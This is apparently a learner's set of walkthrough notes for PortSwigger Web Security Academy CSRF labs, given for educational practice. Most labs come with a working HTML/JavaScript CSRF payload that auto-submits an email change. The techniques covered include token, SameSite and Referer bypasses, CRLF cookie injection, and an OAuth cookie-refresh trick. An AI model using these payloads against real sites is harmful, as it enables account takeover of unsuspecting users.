# Lab 1: CSRF vulnerability with no defenses
- This lab's email change functionality is vulnerable to CSRF.
- To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
- Solving this lab, I passed the below payload into the lab's exploit server
```
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
    <form action="https://0a93002503ee2bc181631689001e00e1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hello@text.com">
      <input type="submit" value="Submit CSRF">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
- Since I don't have burpsuite pro, I made use of chatgpt to generate the CSRF POC for me.

# Lab 2: CSRF where token validation depends on request method  
- This lab's email change functionality is vulnerable to CSRF. 
- It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
- To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
- I was able to complete this lab by changinng POST request to GET, then I csrfed it. code below
```
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF PoC - GET</title>
  </head>
  <body>
    <img src="https://0a5400f4038240a980020374006300db.web-security-academy.net/my-account/change-email?email=hello%40text.com&csrf=0BAFkWjZVOYMWpLg1pBLmXkOoNy1rtVN" style="display:none">
  </body>
</html>
```
# LAB 3: CSRF where token validation depends on token being present
- Just Like the first Lab but here we remove the csrf token
```
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
    <form action="https://0ae9008403f5b22881ae5ded008c006c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hello@text.com">
      <input type="submit" value="Submit request">
    </form>

    <script>
      // Automatically submit the form on page load
      document.forms[0].submit();
    </script>
  </body>
</html>
```
# Lab 4: CSRF TOKEN WERE NOT TIED TO USER SECTION
- SOlUTION TO THIS LAB
```
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
    <form action="https://0ab50082036063cc80a112dc0081008a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="bee@test.com">
      <input type="hidden" name="csrf" value="9Y0HPjXgogFOQnyPD69MOktzslspDEde">
      <input type="submit" value="Click me">
    </form>

    <script>
      // Auto-submit the form
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# LAB 5: CSRF where token is tied to non-session cookie
```
<img src='https://0add000703ffaefd8049498800e000bc.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TdnrIfZT1PJRDeggKBLh7wAn99OY1NnC%3b%20SameSite=None' onerror='document.forms[0].submit()' >
```

```
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
    <form action="https://0add000703ffaefd8049498800e000bc.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="bee@test.com">
      <input type="hidden" name="csrf" value="Tm1OEUVAkvAi5JOjFbbYSTX084ZBkWwT">
      <input type="submit" value="Click me">
    </form>

    <img src='https://0add000703ffaefd8049498800e000bc.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TdnrIfZT1PJRDeggKBLh7wAn99OY1NnC%3b%20SameSite=None' onerror='document.forms[0].submit()' >
  </body>
</html>
```

- For the above Payload to work, The application must be vulnerable to two things
  - CSRF
  - XSS that reflected in the set-cookie header
- NO further comments

# LAB 6: CSRF where token is duplicated in cookie
```
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
    <form action="https://0ae3006a044d2fe682662fce0010001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="bee@test.com">
      <input type="hidden" name="csrf" value="METGtpjA9tEIYkwoJCXah5QA28GJDtBq">
      <input type="submit" value="Click me">
    </form>

    <img src='https://0ae3006a044d2fe682662fce0010001c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=METGtpjA9tEIYkwoJCXah5QA28GJDtBq%3b%20SameSite=None' onerror='document.forms[0].submit()' >
  </body>
</html>
```

# LAB &: SameSite Lax bypass via method override
- If the site does not have any csrf token but uses same site restriction to prevent CSRF
- We can bypass with this payload

```
!-- POST method override CSRF PoC -->
<!DOCTYPE html>
<html>
  <body>
    <form action="https://0a1600d504a345d481bf706500bf002e.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="hello@text.com">
      <input type="submit" value="Submit">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Lab: SameSite Strict bypass via client-side redirect

- To solve this lab, We have to make use of DOM redirect 
- When You make a comment, The site automatically redirect to another page after 3 seconds
- Here is the redirect of the link: post/comment/confirmation?postId=6
- This PostId can be reconstructed like this post/comment/confirmation?postId=my-account
- Then we have not found error
- Now we can do something like this : post/comment/confirmation?postId=../my-account/
- It works, Now, It redirects back to my account
- Now we can attempt to change the email
- post/comment/confirmation?postId=../my-account//change-email?email=hello%40text.com&submit=1
- So we can deliver the payload like this
```
<script>
window.location="https://0ada006904d7f8cc809c215000890045.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=evileye%40text.com%26submit=1"
</script>
```

# Lab: SameSite Strict bypass via sibling domain
- This lab can only be Done when you understand websocket vulnerabilities, coming back to solve this when I understand that topic.

# Lab: SameSite Lax bypass via cookie refresh
## Study the change email function
- In Burp's browser, log in via your social media account and change your email address.
- In Burp, go to the Proxy > HTTP history tab.
- Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.
- Look at the response to the GET /oauth-callback?code=[...] request at the end of the OAuth flow. 
- Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. 
- As a result, the browser will use the default Lax restriction level.

## Attempt a CSRF attack
- In the browser, go to the exploit server.
- Use the following template to create a basic CSRF attack for changing the victim's email address:
```
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```
- Store and view the exploit yourself. 
- What happens next depends on how much time has elapsed since you logged in:
- If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. 
- In this case, repeat this step immediately.
- If you logged in less than two minutes ago, the attack is successful and your email address is changed. 
- From the Proxy > HTTP history tab, find the POST /my-account/change-email request and confirm that your session cookie was included even though this is a cross-site POST request.

## Bypass the SameSite restrictions
- In the browser, notice that if you visit /social-login, this automatically initiates the full OAuth flow. 
- If you still have a logged-in session with the OAuth server, this all happens without any interaction.
- From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.

## Go back to the exploit server.
- Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login, then submits the email change request after a short pause. The following is one possible approach:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

- Note that we've opened the /social-login in a new window to avoid navigating away from the exploit before the change email request is sent.
- Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.
- Observe that, after a pause, the CSRF attack is still launched. 
- However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.

## Bypass the popup blocker
- Realize that the popup is being blocked because you haven't manually interacted with the page.
- Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:

```
<form method="POST" action="https://0aee00be03ae08db8191b70800ec00e3.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0aee00be03ae08db8191b70800ec00e3.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```
- Test the attack on yourself again while monitoring the proxy history in Burp.
- When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. 
- After 5 seconds, notice that the CSRF attack is sent and the POST /my-account/change-email request includes your new session cookie.
- Go to your account page and confirm that your email address has changed.
- Change the email address in your exploit so that it doesn't match your own.
- Deliver the exploit to the victim to solve the lab.

# Lab: CSRF where Referer validation depends on header being present
- Solving the lab: make a request to the change email normally
- Go to burpsuite history and send the request to repeater
- In repeater, change the value of the referer, You will notice error message
- Remove the header to see if the  request will go through
- Notice That it went through, Now construct a csrf like this
```
<html>
  <head>
    <title>CSRF PoC</title>
    <meta name="referer" content="never">
  </head>
  <body>
    <form action="https://0ad300da037a34bf80e70395003f0014.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="bee@test.com">
      <input type="submit" value="Click me">
    </form>

    <script>
      document.forms[0].submit();
    </script>
    
  </body>
</html>
```
- Launch the payload against yourself to see if it is going to be successful 
- Notice that Your email has been changed 
- Now, deliver the payload to victim with another email
- Lab Solved successfully

# Lab: CSRF with broken Referer validation
- Send the change email request to burp repeater 
- Remove the value of the referer and notice the request was unsuccessful
- Remove the referer totally and notice the request is not successful
- Modify the value of the referer but keep the website in the referer, notice the request was successful
- Craft a csrf that looks like this
```
<html>
  <head>
    <title>CSRF PoC</title>
    
  </head>
  <body>
    <script>
        history.pushState("", "", "/?0a1800de043fa34d8012215500fc00e0.web-security-academy.net")
    </script>
    <form action="https://0a1800de043fa34d8012215500fc00e0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="bees@test.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
    
  </body>
  ```
- In the header of your exploit server, put **Referrer-Policy: unsafe-url**
And you will solve the lab